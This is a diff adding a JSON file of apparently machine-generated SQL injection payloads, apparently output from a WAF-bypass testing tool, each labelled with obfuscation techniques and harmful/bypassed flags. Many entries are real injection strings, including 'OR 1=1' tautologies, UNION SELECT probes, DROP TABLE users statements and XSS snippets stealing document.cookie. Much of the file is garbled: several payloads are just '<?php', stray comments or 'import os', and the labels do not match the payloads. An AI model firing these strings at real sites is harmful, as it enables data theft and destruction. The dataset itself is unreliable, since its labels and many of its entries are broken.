@@ -1,0 +1,402 @@
+[
+    {
+        "payload": "<script>alert(1)</script><%%=; /* 4 ) ( ' OR 1 = 1*/%> <%&=?php phpinfo();<?xml version=\"1.0\"?>",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "http://yourwebsite/admin/login?username=test&password=%25C3%25A9t4sT1dK0c8h&dbtype%3Dmysql",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "SELECT * FROM users WHERE username = 'admin' and NOT EXISTS(select 1 from userdetails where email = 'username@example.com') ;",
+        "technique": "Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "http://[target_site]/?q='; DROP TABLE users;-- ' OR 1=1 UNION SELECT NULL, ';'  UNION ALL SELECT NULL FROM INFORMATION_SCHEMA.`TABLES` WHERE table_name='users' AND create_table = TRUE;' -- this will be added to your query",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?PHP",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "Time-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "' OR '1=1'--''\" UNION SELECT 2,3 FROM users WHERE id = ''--'\" union select * from user where name like '%';' -- http://example.com/vulnerable_page?id='UNION ALL SELECT 1 FROM users WHERE 0=1;''`",
+        "technique": "Boolean-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "-- This is just an example, do NOT attempt to use it in real attacks!",
+        "technique": "Time-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "' OR 'UNION SELECT 1, NULL,'  -- (This is just an example line) -- Please note that this should be replaced with your actual query and values to ensure it runs successfully on each system.--`",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "'http://example.com/index?q=';'` UNION SELECT 1, '--', NULL FROM INFORMATION_SCHEMA.VIEWS WHERE CHARACTER LENGTH(REPLACE(TABLE_NAME,'','.')) > 0;`",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "--  UNION SELECT NULL 1 AS id, 'test' as name; --",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?phps>",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "-- https://www.owasp.org/index.php/SQLi-Time-Based-Blind-Full-Bypass",
+        "technique": "Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "SELECT 1 UNION SELECT NULL; --  The original table has to be empty or have some data, otherwise this won't work.",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "http://www.example.com/phpMyAdmin/?q=admin&dbhost=%27%0A%0D%0ADATA%0a%3Cscript%0A%20alert('SQL Injection!');%0E%0F",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "' OR '1=1'--  -- (SQLi)",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "'UNION SELECT NULL, 123 FROM TABLE';`",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?PHP",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Time-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "-- This is an example of a Time-Based blind Full Bypass Payload",
+        "technique": "Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "import os",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "' OR '1=1--'' UNION SELECT 0 AS columnname FROM INFORMATION_SCHEMA.`COLUMNS` WHERE `REF_COLUMN` = '' --  UNION SELECT NULL, CAST(SUBSTRING(CAST('test', CHARSET) || SUBSTR(ID,13), 256) AS VARCHAR)` ;",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "'<?php script='http://your-target/malicious-script'.?param=';; DROP TABLE users WHERE 1 = 0;' ;?>`",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "' OR '1=1-- 2037/1985 -- '; DROP TABLE IF EXISTS users; DELETE FROM `users` WHERE id = \"4\"; SELECT * FROM information_schema.tables WHERE table_name LIKE '%test%';''",
+        "technique": "Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": ";-- ' or 1=1 --' UNION SELECT * FROM users WHERE username LIKE '%';",
+        "technique": "Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "'OR 1=1--'; OR 'SELECT * FROM users WHERE name = '' AND age > 0; UNION SELECT NULL, RAND() AS user_id;' -- or any other vulnerable website script to be bypassed! -->  <script>alert('Hacked!');</script>`",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+Boolean-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "'http://yoursite/login?action=process&username='--''%7B'+''.join([1,2])+'%' + 'select* from users where username=\\'%0a\\'\\n -- 3d68549c-e2db-4ad6-bfae-ccbbcabc7ba9;jsw';",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "SELECT /*  */",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Boolean-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "-- Bypass Payload (Boolean based)",
+        "technique": "Boolean-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "--  payload 2013 - String length is limited, but you can modify it to reach your target",
+        "technique": "Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "def myfunc(value): # obfuscation 1 (function call)",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "http://[yourhost]/?page=login&username=<script>alert(document.cookie);</script>&password=[1234567890]",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "-- This is just an example, use this in your own testing and security research responsibly!",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?PHP",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?PHP",
+        "technique": "Boolean-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "'-- Bypass Payload' --",
+        "technique": "Boolean-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "'OR '1=1'--'' OR lower(CASE WHEN 0 = 1 THEN NULL ELSE CONVERT(VARCHAR,substring((SELECT name FROM yourtable WHERE yourcondition),3)) END)='-- ''';",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "-- Request HTTP POST with request body like this (adjust based on your target)",
+        "technique": "Time-based Blind_full_bypass",
+        "attack_type": "sql_injection_blind",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    }
+]
